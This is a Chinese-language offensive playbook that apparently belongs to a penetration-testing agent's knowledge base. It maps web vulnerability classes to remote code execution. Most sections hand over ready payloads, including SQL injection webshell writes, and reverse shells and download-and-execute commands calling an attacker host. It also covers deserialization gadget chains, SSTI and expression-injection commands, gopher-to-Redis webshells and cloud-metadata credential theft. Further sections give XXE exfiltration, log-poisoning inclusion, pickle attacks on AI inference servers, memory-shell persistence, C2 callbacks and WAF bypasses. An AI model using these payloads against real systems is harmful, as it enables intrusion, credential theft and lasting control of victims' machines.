# RCE 全攻击面手册：哪些漏洞能打 RCE + 发现→利用全流程 (2026)

> name: kb-rce-all-attack-surface-2026
> description: 全量梳理能通向 RCE 的漏洞类型（SQLi/反序列化/上传/SSTI/SSRF/XXE/表达式注入/文件包含/中间件N-day/AI框架新面），每条链路给出「发现→验证→利用→取证」完整流程与可落地 payload
> tags: [rce, getshell, webshell, sql-injection, deserialization, ssti, ssrf, xxe, file-upload, 反序列化, 模板注入, 云元数据]
> date: 2026-08-14
> 定位: 知识库 RCE 分类的总纲/决策树，衔接各专册。落地形态=webshell/内存马/反弹shell/C2。

---

## 0. RCE 本质与分类总览

**RCE(远程代码执行)本质**：攻击者输入最终到达目标上的**代码解释器或命令解释器**并被执行。中间隔了多少层不重要——只找"输入到执行"的通路。

**两大类落地形态**：
| 形态 | 载体 | 典型工具 | 特征 |
|------|------|---------|------|
| WebShell | PHP/JSP/ASP 文件 | 冰蝎/GSL5/蚁剑 | 走 Web 请求执行，持久可管理 |
| 内存马 | JVM 内 Filter/Servlet/Listener | 各类内存马注入器 | 无文件落地，重启消失 |
| 反弹 Shell | TCP 回连 | srv.py listen/nc | 交互式命令执行 |
| C2 会话 | 代理客户端 | ChanaAgent C2 | 长期控制+内网穿透 |

**核心思维**：RCE 极少是单一 bug，2025 实战更多是**多阶段链**——SSRF 打内网→未认证 Redis→写文件→RCE；XXE 读配置→拿口令→后认证命令注入→RCE。所以每条链路都要会"接力"。

---

## 1. 漏洞类型 → RCE 映射总表（哪些能 RCE）

> 判定顺序：先看该类型是否满足"输入可达执行器"，再看是否存在必要中间件（web 目录/高权限 DB/类路径 gadget）。

| # | 漏洞类型 | RCE 条件 | 典型链路 | 专册 |
|---|---------|---------|---------|------|
| 1 | SQL 注入 | 高权限库账号 + 堆叠/写权限 | MySQL OUTFILE/UDF、MSSQL xp_cmdshell、Pg COPY、Oracle JVM | `database_to_getshell.md` |
| 2 | 反序列化 | 反序列化入口 + 类路径 gadget | Java ysoserial、PHP phpggc、Python pickle、ShadowMQ | `java_rce_deserialization.md` |
| 3 | 文件上传 | 可写 web 目录 + 可执行后缀/绕过 | 一句话马、.htaccess/.user.ini、图片马、条件竞争 | `php_webshell_rce.md` |
| 4 | 任意文件写 | 可写关键路径 | crontab/SSH key/.htaccess/启动脚本、Zip Slip | 本手册 §2.3 |
| 5 | SSTI 模板注入 | 模板引擎 + 沙箱绕过 | Jinja2/Freemarker/Velocity/Twig | `ssti_upload_getshell.md` |
| 6 | SSRF | 支持 gopher/dict + 内网可利用服务 | 云元数据 AK/SK、gopher→Redis、内网 Docker | 本手册 §2.5 |
| 7 | 表达式注入 | EL 引擎 + 反射链 | SpEL/OGNL/MVEL/JEXL 表达式 | `kb_ssti_template_injection_2026.md` |
| 8 | XXE | XML 解析 + 外部实体未禁 | file:// 读文件→凭据→命令注入、expect:// | 本手册 §2.7 |
| 9 | 路径遍历/文件包含 | 包含可控文件或日志 | LFI→日志投毒→RCE、php://filter 链 | `kb_lfi_rfi_2026.md` |
| 10 | 命令注入 | 参数进 system/exec | 直接拼接/间接 bash -c/二阶存储 | 本手册 §2.6 |
| 11 | 中间件/框架 N-day | 版本匹配 | Tomcat/WebLogic/Shiro/Fastjson/Log4j | `kb_middleware_rce_master_2026.md` |
| 12 | 认证绕过+预认证 | 过滤器绕过 | Oracle EBS CVE-2025-61882 等链 | `kb_boundary_unauth_rce_2026.md` |
| 13 | AI/LLM 框架 | 未认证 ZMQ/模型加载 | pickle-over-ZMQ、GGUF 内嵌 SSTI | 本手册 §2.11 |

> 记忆口诀：**"注入进执行器"** 六大门——SQLi、反序列化、上传、SSTI、SSRF、XXE；外加 N-day 与 AI 新面。

---

## 2. 各漏洞类型「发现→验证→利用→取证」全流程

### 2.1 SQL 注入 → RCE（数据库三叉戟）

**原理**：Web 应用用高权限 DB 账号连库，注入点支持堆叠查询或管理语句时，可借数据库能力执行 OS 命令/写文件。

**发现（确认 DB 类型与权限）**：
```
# 指纹 DB 类型（必做，决定打法）
id=1 AND SLEEP(3)          # MySQL 特征
id=1;WAITFOR DELAY '0:0:3' # MSSQL 特征
id=1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)  # Oracle 特征

# MySQL 查权限（File_priv=Y 才可写文件）
id=0 UNION SELECT NULL,File_priv,NULL FROM mysql.user WHERE user=user()--
# 查 secure_file_priv（NULL=禁止导出，空=不限）
id=0 UNION SELECT NULL,@secure_file_priv,NULL--
# 查 web 根目录（报错泄露 / datadir / @@basedir）
```

**验证（无害确认）**：堆叠注入 `id=1;SELECT 1` 返回正常即具备堆叠能力（高价值信号）。

**利用**：
```sql
-- A. MySQL INTO OUTFILE 写 webshell（需 secure_file_priv 空 + 已知 web 根）
id=0 UNION SELECT "<?php @eval($_POST['cmd']);?>",NULL,NULL INTO OUTFILE "/var/www/html/shell.php"--

-- B. MySQL UDF 命令执行（先写 .so 到 plugin_dir，再建函数）
SELECT 0x4d5a9000... INTO DUMPFILE '/usr/lib/mysql/plugin/evil.so';  -- 16进制so
CREATE FUNCTION sys_exec RETURNS INT SONAME 'evil.so';
SELECT sys_exec('id > /tmp/pwned.txt');

-- C. MSSQL xp_cmdshell（需 sysadmin）
id=1;EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE--
id=1;EXEC xp_cmdshell 'powershell IEX(New-Object Net.WebClient).DownloadString("http://attacker/rev.ps1")'--

-- D. PostgreSQL COPY 命令执行
id=1;COPY cmd FROM PROGRAM 'nc -e /bin/sh attacker.com 4444';--

-- E. Oracle Java 存储过程执行
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "L" AS
import java.io.*; public class L { public static void main(String[] a)throws Exception{ Runtime.getRuntime().exec(a[0]); }};
CREATE OR REPLACE PROCEDURE p(c IN VARCHAR2) LANGUAGE JAVA NAME 'L.main(java.lang.String[])';
EXEC p('/bin/sh -c id');
```

**取证**：`SELECT sys_exec('ping <dnslog子域>')` → dnslog 回连 IP=DB 服务器出口 IP。

**工具**：`sqlmap.py --os-shell`（自动 OUTFILE/xp_cmdshell）、`--sql-shell`。

**门槛**：必须实证 `File_priv=Y` + `secure_file_priv` 允许 + 堆叠可用，三者缺一不可；只读注入（无堆叠/无写权限）**不构成** RCE 前提。

---

### 2.2 反序列化 → RCE（Java/PHP/Python 全家）

**原理**：程序把不可信数据反序列化成对象，攻击者构造的 gadget 链在对象还原过程中执行任意代码。

**发现（入口点识别）**：
- Java 二进制序列化魔数：`AC ED 00 05`（hex）/ `rO0A`（base64）
- PHP 序列化文本：`O:4:"User":2:{s:8:"username";...}`
- Python pickle：`b'\x80\x05...'` 协议头
- 常见入口：session cookie、`__VIEWSTATE`、JSON body、消息队列、`viewState`/`token` 参数

**验证（无害优先）**：Java 用 `URLDNS` gadget 只触发 DNS 查询不执行命令：
```
java -jar ysoserial.jar URLDNS "http://UNIQUE.burpcollaborator.net" | base64
# 有回连 = 确认反序列化点（且未 RCE，安全验证）
```

**利用**：
```bash
# Java（ysoserial，按类路径选链）
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker/rce?cmd=id' | base64
java -jar ysoserial.jar CommonsCollections6 "whoami" | base64 -w0
java -jar ysoserial.jar CommonsBeanutils1 "bash -c {echo,<b64>}|{base64,-d}|{bash,-i}" | base64
# 打点：注入到 cookie -b "session=$PAYLOAD" / POST body / 参数

# PHP（phpggc，按框架选链）
./phpggc Laravel/RCE1 system "id" -b
./phpggc Symfony/RCE4 exec "whoami" -b

# Python（pickle 自定义 __reduce__）
python3 -c 'import pickle,os; print(pickle.dumps(os.system("id")).hex())'
```

**2025 重点 CVE-2025-24813（Tomcat 会话反序列化）**：Partial PUT + 路径穿越 + gadget 反序列化：
```
# 前置：default servlet readonly=false + PersistentManager FileStore + cc enableUnsafeSerialization=true
python cve-2025-24813.py http://target:8080 --ysoserial ysoserial.jar -c 'id' --gadget CommonsCollections7
```

**取证**：命令回显（弹回显链）或 dnslog `ping <子域>` 回连 IP 作证据。

**Shiro 专项**：见 `shirokit.py scan` 一条命令爆破 key+自动 RCE（记忆：SPC 探测不可用 URLDNS，见 feedback_shiro_deleteme_payload）。

---

### 2.3 文件上传 / 任意文件写 → RCE

**原理**：上传点只校验后缀/Content-Type，或文件名可路径穿越，使攻击者能把可执行内容写入可执行目录。

**发现**：功能点 `上传/avatar/attachment/file` 等；传正常文件→直接访问 URL 看是否被解析执行。

**验证**：上传 `test.txt`（内容 `phpinfo` 风格探针），直接访问确认可访问目录。

**利用（绕过优先序）**：
```
# 1. 后缀黑名单绕过
shell.php3/php4/php5/php7/pht/phtml/phar/.php5
shell.asp/.aspx/.ashx/.asmx/.cer      # IIS
shell.jsp/.jspx/.jspf                 # Java
# 2. 双后缀/特殊字符
shell.php.jpg   shell.php.   shell.php%20   shell.php%0a   shell.php::$DATA(NTFS)
shell.php;.jpg  # IIS 截断
# 3. Content-Type/幻数伪造
Content-Type: image/jpeg + GIF89a 头 + <?php @eval($_POST[c]);?>
# 4. 配置文件接管（核心）
#    .htaccess：让目录内任意扩展名按 PHP 执行
#    AddType application/x-httpd-php .jpg
#    .user.ini（PHP-FPM 目录级）：auto_prepend_file=shell.jpg
# 5. 路径穿越写任意目录
filename="../../../var/www/html/shell.php"   # 或 ..%2f 编码
# 6. Zip Slip：恶意 zip 内含 ../../../etc/cron.d/backdoor → 定时任务 RCE
# 7. 条件竞争：上传校验后删除前访问执行
```

**取证**：`http://target/shell.php?c=whoami` 命令回显；反连 `bash -i >& /dev/tcp/IP/4444`。

**工具**：GSL5 生成/连接 webshell（`gsl5.jar mcp 9123`）；蚁剑/冰蝎管理。

**门槛**：能**直接 URL 访问执行**才算 RCE；仅上传成功但不可执行（静态目录）不构成。

---

### 2.4 SSTI 模板注入 → RCE

**原理**：用户输入直接拼入模板源码被模板引擎求值，模板语言内建能力（反射/类加载/文件）被利用。

**发现（数学探测，勿停在算术）**：
```
{{7*7}}          → 49      Jinja2/Twig/Pebble
${7*7}           → 49      Freemarker/Velocity/Mako
<%= 7*7 %>       → 49      ERB/EJS
#{7*7}           → 49      Thymeleaf/EL
*{7*7}           → 49      Thymeleaf(Spring)
#set($x=7*7)$x   → 49      Velocity 独有
<#assign x=7*7>${x} → 49   Freemarker 独有
```

**引擎指纹**：`{{7*'7'}}` 返回 `"7777777"`=Jinja2、返回 `49`=Twig；`${.now}` 出时间=Freemarker。

**利用**：
```jinja2
# Jinja2（Flask 全家，config 直取）
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen("id").read()}}          # 下划线被滤时
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}  # WAF绕过(hex)

# Freemarker（Java）
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
# Execute 被禁时：ObjectConstructor 反射 ProcessBuilder / JythonRuntime

# Velocity（Java 老系统）
#set($s="")#set($x=$s.class.forName("java.lang.Runtime"))

# Twig（PHP/Symfony）
{{['id']|filter('system')}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**2025-2026 新变体**：Thymeleaf `__${...}__::.x` SpEL 预处理器逃逸；GGUF 模型文件内嵌 Jinja2（SGLang CVE-2026-5760，见 §2.11）。

**取证**：命令输出 `uid=0(root)...` 直接回显。

**门槛**：模板引擎**沙箱外** + 命令能回显/外带才构成；SandboxedEnvironment 内的受限注入不构成 RCE。

---

### 2.5 SSRF → RCE

**原理**：服务端请求用户可控 URL，借服务端身份访问内网/云元数据，再用 gopher/dict 等协议操作内网服务（Redis 最经典）。

**发现**：`url/imageUrl/dest/fetch/webhook/return_url/redirect` 等参数；PDF/截图生成器、webhook 配置、OAuth redirect_uri。

**验证**：指向 `http://<dnslog域>` 有回连=出网 SSRF；`file:///etc/passwd` 有回显=文件读取。

**利用（按价值排序）**：
```
# A. 云元数据 → AK/SK（最高价值，直接横向）
#    AWS IMDSv1
http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}
#    AWS IMDSv2（需 PUT token）
#    GCP（需 Metadata-Flavor: Google 头）
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
#    阿里云 / 腾讯云
http://100.100.100.200/latest/meta-data/            # 阿里
http://metadata.tencentyun.com/latest/meta-data/    # 腾讯

# B. gopher → Redis 写 webshell（HTTP SSRF 万能桥）
#    Gopherus 生成 RESP payload，URL 编码后填入 url=
gopher://127.0.0.1:6379/_FLUSHALL%0d%0aCONFIG%20SET%20dir%20/var/www/html%0d%0a...SAVE%0d%0a
#    Redis 核心 5 连：FLUSHALL → CONFIG SET dir web根 → dbfilename shell.php → SET "<?php @eval(...)" → SAVE

# C. gopher → Redis 写 crontab/SSH key（web 根不可写时）
CONFIG SET dir /var/spool/cron/  → 写 root 反弹 shell 任务

# D. 内网服务探测后利用
#    Docker API 127.0.0.1:2375 → API 建容器挂载宿主 → RCE
#    Kubelet 10250 → 容器 exec
#    dict:// 打内网未授权服务
```

**地址绕过**：`127.1`、`2130706433`(十进制)、`0x7f000001`、`[::1]`、`[::ffff:127.0.0.1]`、DNS rebinding（rbndr.us）、`%00@`/`#@` URL 解析混淆。

**取证**：回连 IP=目标出网 IP；云元数据拿到的 AK/SK 可验证权限（`aws s3 ls` 实证）。

**门槛**：SSRF 只到 dnslog 回连**不构成**漏洞（规则见 CLAUDE.md：需拿到云元数据 AK/SK 或内网数据）；能 gopher 打 Redis 且写文件成功=实证 RCE 前提。

---

### 2.6 命令注入 / 表达式注入 → RCE

**原理**：参数拼入 system/exec/Runtime.exec 或表达式引擎（SpEL/OGNL），注入解释器语法。

**发现**：`cmd/ip/domain/ping` 等参数；Java 框架 `parseExpression`、`@Value`、Struts2 OGNL。

**验证（无害算术/时间）**：`ip=127.0.0.1;sleep 3` 延迟 3s；`ip=127.0.0.1 && whoami` 命令回显。

**利用**：
```bash
# 直接注入（Unix/Windows 分隔符）
;id   |id   && id   || id   `id`   $(id)   %0aid
# 编码绕过（空格/符号被滤）
{echo,<b64>}|{base64,-d}|{bash}   # 无空格
$IFS$9id                          # IFS 分隔
cmd.exe /c c:^o^m^p             # Windows 字符逃逸

# 间接命令注入（数组模式也要测！bash -c 拼接照样注入）
ProcessBuilder("bash","-c",userInput)   # userInput 含 ;id 即 RCE

# SpEL（Spring）
${T(java.lang.Runtime).getRuntime().exec('id')}
T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/bash","-c","id"})
# OGNL（Struts2）
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"id"})).start()}
```

**取证**：命令回显 / dnslog `ping <子域>` 回连。

---

### 2.7 XXE → RCE

**原理**：XML 解析器启用外部实体，`file://` 读文件、OOB 外带；结合凭据泄露后命令注入，或 `expect://` 直打。

**发现**：XML 输入点（`Content-Type: application/xml`）、SVG 上传、JSON→XML 转换、SAML 响应。

**验证**：
```xml
<!-- 文件读取确认 -->
<!DOCTYPE email [<!ENTITY test SYSTEM "file:///etc/passwd">]><sender>&test;</sender>
```

**利用**：
```xml
<!-- A. 无回显 OOB 外带（远程 DTD） -->
<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; %send;]>
# evil.dtd: 读文件→base64→拼 URL 打回 attacker 日志

<!-- B. PHP expect:// 直执行（需 expect 扩展） -->
<!ENTITY cmd SYSTEM "expect://id">

<!-- C. XInclude（DOCTYPE 被禁时） -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></foo>

<!-- D. 盲 XXE→SSRF：file:// 读配置→账号口令→后认证命令注入 -->
```

**2025 实例**：CVE-2025-2775（SysAid 未认证 XXE 读 `InitAccount.cmd` 明文口令→后认证命令注入 RCE）。

**取证**：OOB DTD 打回的 base64 文件内容解码 = 数据读取实证。

---

### 2.8 路径遍历 / 文件包含 → RCE

**原理**：读/包含用户可控路径，配合日志投毒或伪协议让包含的内容被 PHP 执行。

**发现**：`file=page` 类参数、上传文件名含 `../`、模板路径可控。

**利用**：
```
# LFI→日志投毒→RCE（Apache/Nginx 日志）
# 1. User-Agent 写 PHP 一句话：
#    UA: <?php system($_GET['c']);?>
# 2. 包含日志文件：
?file=../../var/log/apache2/access.log&c=id

# PHP 伪协议链（allow_url_include=On 时）
?file=php://input                    # POST 体即 PHP 代码
?file=data://text/plain,<?php system('id');?>
?file=php://filter/convert.base64-encode/resource=index.php   # 读源码

# 路径穿越写文件（任意写→RCE，见 §2.3）
filename="../../../etc/cron.d/backdoor"
```

**取证**：伪协议执行回显 / 定时任务反弹 shell 回连。

---

### 2.9 中间件 / 框架 N-day → RCE（指纹驱动）

**发现**：指纹识别（banner/报错/页面特征/FOFA）命中即查知识库：
```
# 指纹→秒杀卡→全库 POC（CLAUDE.md 强约束流程）
指纹命中 → kb/quick-ref/midware-rce.md 秒杀
       → tools/knowledge_base/srcwiki_poc/{中间件/应用服务器/开发框架}/_index.md
       → 手册未覆盖 → kb_middleware_cve_index_2022_2026.md
```

**高价值 N-day 清单（2024-2026 新增）**：
| CVE/链 | 产品 | 触发 | 备注 |
|--------|------|------|------|
| CVE-2026-34486 | Apache Tomcat Tribes | 集群 4000 端口 CC6 反序列化 | 预认证 |
| CVE-2026-35031 | Jellyfin <10.11.7 | 字幕 Format 写 `/etc/ld.so.preload` → LD_PRELOAD RCE | 9.9 |
| CVE-2026-16723 | FastJson 1.2.68-1.2.83 | @JSONType jar:http 探测→RCE（AutoType 关也中） | `srcwiki_poc/CVE-2026/4796` |
| CVE-2025-24813 | Tomcat | Partial PUT+穿越+会话反序列化 | 需多条件 |
| CVE-2025-61882 | Oracle EBS | return_url SSRF→CRLF→XSLT→RCE | 预认证链 |
| CVE-2026-52806 | Gogs | git rebase 参数注入 | 认证后 |

**验证→利用**：从 POC 文件取完整请求包→Burp Repeater 重放→改目标 IP→确认回显/RCE。

---

### 2.10 认证绕过 → 预认证 RCE（2025-2026 主流）

**原理**：过滤器/网关鉴权可绕过，让 N-day 从"认证后"变"预认证"，价值翻倍。

**典型绕过**：
```
# 过滤器匹配漏洞（tomcat 路径规范化 / off-by-slash）
/..;/admin/   /admin/..;/   /%2e%2e/admin/   //admin//
# 大小写/编码绕过鉴权关键词
/Admin/ /ADMIN/ /%61dmin/
# 请求头注入跳过认证（CRLF 拼接第二个请求）
```

**取证**：预认证触发 N-day 成功执行 = 最高危信号，优先上报。

---

### 2.11 AI/LLM 框架新攻击面 → RCE（2025-2026 重点新增）

**原理**：AI 推理框架（vLLM/SGLang/TensorRT-LLM/Meta Llama）为性能常开**未认证 ZMQ socket** + `pickle.loads()` 反序列化，或模型文件触发 SSTI。

**核心模式 ShadowMQ（复制粘贴传播的 pickle-over-ZMQ）**：
```
发现：目标 8000/vllm 等推理端口暴露；ZMQ 监听 tcp://*
利用：连 socket 直接发 pickle payload（recv_pyobj 等价 pickle.loads）
     → pickle __reduce__ 执行命令 → 装 GPU 矿机/窃模型权重/篡改输出
```

**相关 CVE 清单**：
| CVE | 产品 | 类型 |
|-----|------|------|
| CVE-2025-30165 | vLLM | pickle-over-ZMQ |
| CVE-2025-23254 | TensorRT-LLM | pickle-over-ZMQ (9.3) |
| CVE-2024-50050 | Meta Llama Stack | pickle→JSON 修复源 |
| CVE-2026-14890 | SGLang | expert-parallel 备份子系统 pickle ZMQ |
| CVE-2026-5760 | SGLang | GGUF 模型触发 Jinja2 SSTI |
| CVE-2026-22778 | vLLM | 传递依赖 FFmpeg 漏洞链 |

**发现**：FOFA 搜 `vllm`/`sglang`/推理框架 banner；测未授权 API（`/v1/models` 无鉴权）；扫 8000/8080/6379 附近端口。

**验证**：向 ZMQ 端口发 pickle `__reduce__` 无害命令（如 `os.system("ping <dnslog域>")`）看回连。

**取证**：回连 IP=推理服务器出口；若能执行 `nvidia-smi`/写文件即实证。

**注意**：AI 内容洞企业 SRC 多不收（见 CLAUDE.md）；但**框架 RCE 是基础设施洞**，EDUSRC/公益 SRC 收。

---

## 3. RCE 落地后：接管与持久化

| 阶段 | 动作 | 工具 |
|------|------|------|
| 命令回显 | 无回显用 dnslog/反弹确认 | srv.py listen |
| 写 Webshell | 确认可执行目录后写马 | 冰蝎/GSL5 |
| 内存马 | Java 环境注入 Filter/Listener（重启仍在服务） | 内存马注入器 |
| 上线 C2 | 反弹到 ChanaAgent C2 | <your-c2-server>:8082 |
| 提权 | 见提权专册 | `privilege_escalation_post.md` |

```
# 反弹 shell（Linux）
bash -i >& /dev/tcp/<your-attack-server>/4444 0>&1
# Windows PowerShell
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/rev.ps1')"
```

---

## 4. 通用方法论：发现→验证→利用→取证闭环

```
发现(信号) → 验证(无害确认) → 利用(选链) → 取证(实证) → 定级上报
```

**发现原则（不被动等，主动发包）**：
- 凡"不发包看不见"的攻击面一律主动探测（kb/quick-ref/active-probe.md A-E 五类）
- 每参数一击：命中→深入，未命中→换方向，30s 无果跳过

**验证原则（先无害）**：
- 命令注入/DNS 外带用 `ping <子域>` 而非 `cat /etc/passwd`
- 反序列化用 URLDNS 而非 RCE 链
- 验证码遇阻即换方向

**取证原则（可复现+实证）**：
- dnslog 回连 **IP = 目标出口 IP** 是最强证据
- 命令回显、webshell 访问、AK/SK 权限验证、反弹回连均留包

**上报门槛（CLAUDE.md 四门槛）**：可复现 + 有利用链 + 有明确影响 + 有实证；未满足用"可导致 RCE 的漏洞前提"而非"RCE 漏洞"。

---

## 5. WAF 绕过（RCE payload 被拦时）

```
1. 换 Content-Type（urlencoded → multipart）最高优先级
2. 幽灵比特：参数位置交换 / HPP 同名参数 / 分块传输
3. 编码绕过：URL 双编码 / %09%0a / Unicode 同形字 / 大小写
4. 函数替换：SUBSTR→REGEXP_COUNT（Oracle）/ 引号→CHR 拼接
5. 每函数只试≤10 变体，不一处死磕
```

详细见 `kb_waf_bypass_quickref_2026.md` 与 CLAUDE.md WAF 绕过规则。

---

## 6. 工具链与知识库衔接

```
工具总表:   kb/quick-ref/toolchain.md
中间件RCE:  kb_middleware_rce_master_2026.md + midware_rce_getshell.md
Java反序列化: java_rce_deserialization.md + tools/javachain/(64链黑名单绕过)
PHP Webshell: php_webshell_rce.md
SSTI/上传:   ssti_upload_getshell.md
数据库GetShell: database_to_getshell.md
OA/CMS RCE: oa_cms_rce_collection.md + kb_oa_systems_poc_2026.md
N-day POC:  tools/knowledge_base/srcwiki_poc/ (24分类4756篇)
提权后渗透:  privilege_escalation_post.md
DNSLog:     dnslog_helper/dnslog.py (probe/fire 一键注入盯回连)
攻击服务:   tools/attack_infra/srv.py (jndi/http/listen)
WebShell:   tools/GodzillaSuper/gsl5.jar (GSL5 MCP 9123)
Shiro:      tools/shiro/shiro_pyke/shirokit.py scan <url>
```

---

## 7. Sources（2024-2026 时效性依据）

- [SQLi to RCE 三叉戟: MySQL UDF / MSSQL xp_cmdshell / Oracle JVM](https://aisec.blog.csdn.net/article/details/152257446)
- [MySQL Getshell 姿势汇总](https://x1lys.github.io/2025/01/18/MySQL%E7%9A%84getshell%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF-1/)
- [Insecure Deserialization: Java ysoserial / PHP Object Injection / .NET Gadget](https://payloadplayground.com/blog/insecure-deserialization-exploitation)
- [CVE-2025-24813 Tomcat Session Deserialization RCE PoC](https://github.com/yuzuki-ayanami/CVE-2025-24813)
- [Gadget Chains Unleashed: RCE via Insecure Deserialization](https://hacklido.com/blog/1112-gadget-chains-unleashed-rce-via-insecure-deserialization)
- [SSRF to Redis RCE (Laravel HTB chain)](https://github.com/pythagoras-19/htb-screencrack-solution)
- [SSRFKiller: SSRF detection/exploitation framework](https://github.com/TheMursalin/SSRFKiller)
- [CVE-2023-7231 SSRF to Memcached/Docker RCE chain](https://github.com/BBO513/CVE-2023-7231)
- [SSTI Cheat Sheet: detection/engine fingerprinting/RCE](https://www.vulnsy.com/cheat-sheets/ssti)
- [SSTI Exploitation: Template Injection to RCE](https://payloadplayground.com/blog/ssti-exploitation-template-injection-rce)
- [FacturaScripts path traversal → .htaccess → RCE (GHSA-hgjx-r89m-m7v4)](https://github.com/NeoRazorX/facturascripts/security/advisories/GHSA-hgjx-r89m-m7v4)
- [File Upload Vulnerability Testing: Bypassing Filters to RCE](https://payloadplayground.com/blog/file-upload-vulnerability-testing-bypass-rce)
- [XXE Exploitation: file disclosure, blind OOB, RCE](https://nullsecurityx.codes/xxe-exploitation-attack)
- [XXE Cheat Sheet: classic/blind/error-based/SAML](https://www.vulnsy.com/cheat-sheets/xxe)
- [SysAid XXE→credential→command injection RCE (CVE-2025-2775)](https://www.ionix.io/blog/sysaid-on-prem-xml-external-entity-vulnerability-cve-2025-2775/)
- [ShadowMQ: pickle-over-ZMQ RCE across AI inference frameworks](https://safeguard.sh/resources/blog/shadowmq-ai-inference-engine-rce-pattern-2025)
- [AI Inference Servers Are the New Attack Surface (CSA)](https://labs.cloudsecurityalliance.org/research/csa-research-note-lmdeploy-inference-server-ssrf-20260426-cs/)
- [SGLang pickle RCE cluster (CERT/CC VU#326070)](https://kb.cert.org/vuls/id/326070)
- [Oracle EBS Pre-Auth RCE Chain (CVE-2025-61882)](https://success.trendmicro.com/en-US/solution/ka-0021286)
- [Rapid7 Analysis: CVE-2025-20362 auth bypass chain](https://www.rapid7.com/blog/post/ra-cve-2025-20362-analysis/)

---

> 相关: [RCE/GetShell 索引](./_index.md) | [中间件 RCE Master](./kb_middleware_rce_master_2026.md) | [上一级索引](../README.md) | [POC 全库](../srcwiki_poc/README.md)
